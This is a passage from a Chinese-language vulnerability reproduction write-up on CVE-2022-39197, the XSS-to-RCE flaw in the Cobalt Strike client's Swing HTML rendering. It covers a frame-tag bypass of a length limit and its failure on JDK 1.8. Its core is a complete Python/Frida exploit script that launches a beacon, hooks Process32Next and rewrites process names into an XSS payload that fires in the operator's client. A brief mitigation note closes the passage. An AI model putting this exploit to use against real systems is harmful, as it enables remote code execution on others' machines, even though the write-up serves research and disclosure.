测的时候会发现毫⽆反应。
我们在翻翻代码，还记得前⾯依稀看到过frame标签
实现了⼀个叫做frame的标签，我们也懒得看代码了，直接百度⼀下
按照这个格式，frame标签有熟悉的src属性可以引⼊外部⻚⾯。但如果我们不在外层套frameset标签的话
会报错
解决⽅法是套⼀个frameset
当然还有⼀个⼩技巧可以进⼀步压缩
1
这也是可以运⾏的。
这在jdk⾼版本的时候是可以成功引⼊外部⻚⾯的，但是在java8俗称j8的jdk1.8上却会报错
这个是由于frame在渲染frameview的时候会强制转换其⽗组件的类型为这个类型，然⽽转换失败了就会
报错。这个问题在jdk1.8⾥是⽆解的，这也是我在⼀开始认为⽆法绕过⾸⻚⻓度限制的原因（因为我⽤的
jdk1.8）。
好了，总之引⽤frame标签就可以绕过⾸⻚的⻓度限制了。
那么如何在jdk1.8的情况下继续攻击⽬标呢？
0x05 ⽆视jdk版本的RCE 
前⾯解释过了，⾸⻚受到metadata的⻓度的限制，⼏乎只有frame标签可以绕过限制，⽽jdk1.8版本的情
况下是不可能使⽤frame标签进⾏绕过的。那么我们如何进⾏攻击？
这时候我们就要退⽽求其次，假设攻击者可以和beacon进⾏交互操作的情况下看看能不能RCE。答案是
肯定的。
正如前⾯所说，beacon和teamserver的交互⼤体分为两个部分⼀个是上线包的RSA另⼀个是后续命令下
发的AES，因此我们只需要在命令下发的AES流程⾥注⼊数据，那就可以⽆视metadata的⻓度限制问题从
⽽进⾏RCE了。
这样讲很抽象，可以看点实际的。
也就是说除了⾸⻚那个列表和eventlog以外所有命令下发的回显和交互都是在AES⾥传递数据的，因此只
要我们能看到的界⾯数据可以控制，就可以进⾏XSS攻击！
这⾥我通过frada脚本来hook win api修改tasklist返回的进程名，将进程名改写成攻击payload，当攻击者
点击beacon执⾏列出进程时，只要他浏览到带有payload的进程名，就会执⾏RCE！
我在这个项⽬的基础上进⾏的修改 https://github.com/TomAPU/poc_and_exp/blob/master/CVE-2022-
39197/cobaltfire.py
我的frada脚本内容是
import frida
import time
import argparse
def spoof_user_name(target,url):
    #spawn target process
    print('[+] Spawning target process...')
    pid=frida.spawn(target)
    session=frida.attach(pid)
    js='''
    var payload="beacon.exe            "
    payload=Array.from(payload).map(letter => letter.charCodeAt(0))
    var Process32Next=Module.findExportByName("kernel32.dll", 'Process32Next')
    Interceptor.attach(Process32Next, {
        onEnter: function(args) {
            //var hProcessSnap=args[0]
            var info=args[1];
            this.info = info;
            //console.log(this.info);
            this.szExeFile=this.info.add(0x24);
           // console.log(this.szExeFile);
        },
        onLeave: function(retval) {
        if(Memory.readAnsiString(this.szExeFile) == 'beacon.exe')//当进程名称为beacon时修
改其名称，可以替换成其他
        {
            Memory.writeByteArray(ptr(this.szExeFile), payload)
            console.log("find beacon.exe write payload")
        }
        //console.log(Memory.readAnsiString(this.szExeFile));
        }
    });
    '''#.replace('http://127.0.0.1/',url)
    script = session.create_script(js)
    script.load()
    #resume
    frida.resume(pid)
    print('[+] Let\'s wait for 10 seconds to ensure the payload sent!')
    #wait for 10 seconds
    time.sleep(1000)
    #kill
    frida.kill(pid)
    print('[+] Done! Killed trojan process.')
    exit(0)
def showbanner():
    #Thanks http://patorjk.com/ for creating this awesome banner
    banner=''' $$$$$$\            $$\                 $$\   $$\     $$$$$$$$\ $$\           
$$  __$$\           $$ |                $$ |  $$ |    $$  _____|\__|                     
$$ /  \__| $$$$$$\  $$$$$$$\   $$$$$$\  $$ |$$$$$$\   $$ |      $$\  $$$$$$\   $$$$$$\   
$$ |      $$  __$$\ $$  __$$\  \____$$\ $$ |\_$$  _|  $$$$$\    $$ |$$  __$$\ $$  
__$$\ 
$$ |      $$ /  $$ |$$ |  $$ | $$$$$$$ |$$ |  $$ |    $$  __|   $$ |$$ |  \__|$$$$$$$$ 
|
$$ |  $$\ $$ |  $$ |$$ |  $$ |$$  __$$ |$$ |  $$ |$$\ $$ |      $$ |$$ |      $$   
____|
\$$$$$$  |\$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ |  \$$$$  |$$ |      $$ |$$ |      
\$$$$$$$\ 
 \______/  \______/ \_______/  \_______|\__|   \____/ \__|      \__|\__|       
\_______|
                                                        CVE-2022-39197 PoC by @TomAPU
                                                        '''
    print(banner)
parser = argparse.ArgumentParser(description='''This is a PoC for CVE-2022-39197, 
allowing to disclose CobaltStrike users' IP addresses by an exploit of XSS.(Well, 
clearly I haven't figure out how to trigger an RCE).
WARNING: This tool works by executing the trojan generated by CobaltStrike and hooking 
GetUserNameA to add XSS payload to beat the server. So, please, execute it in a 
virtual machine!
Currently, this POC only supports X86 exe payloads, and of course, works on Windows.
''')
parser.add_argument('-t', '--target', help='target trojan sample', required=False)
parser.add_argument('-u', '--url', help='URL for server to load as img, considering 
the limit of length, it should be less than 20 bytes', required=False)
if __name__=='__main__':
    showbanner()
    args = parser.parse_args()
    if args.target and args.url:
        if len(args.url)>20:
            print('[-] URL should be shorter than 20 bytes :(')
            exit(-1)
        spoof_user_name(args.target,args.url)
    else:
        parser.print_help()
frada脚本的编写就不继续赘述了，累了。除了这种⽅式以外还可以基于开源的已经实现全套协议的
https://github.com/darkr4y/geacon 来直接修改打⼊payload。
0x06 修复建议 
修复的话这边可以⽤橙⼦酱发在赛博回忆录星球的⼀个临时布丁来关闭swing的html渲染，这样可以暂时
性的解决这个问题，但是我现在相信，cs的下⼀波RCE可能会很快就来了。
0x07 总结 
在短短的⼏天内真的学了太多东⻄了，我基本是完全不懂java的，⼤部分时候都是⼀知半解的，这⾥要强
烈感谢群友尤其是panda师傅的鼎⼒⽀持，给了我太多的帮助以⾄于我的复现不⾄于太掉链⼦，如果单凭
我⾃⼰估计⾄少要两周起步了。
整个过程涉及到jdk以及cs，分析的复杂度还是挺⾼的，不得不说北⾠是真⽜逼。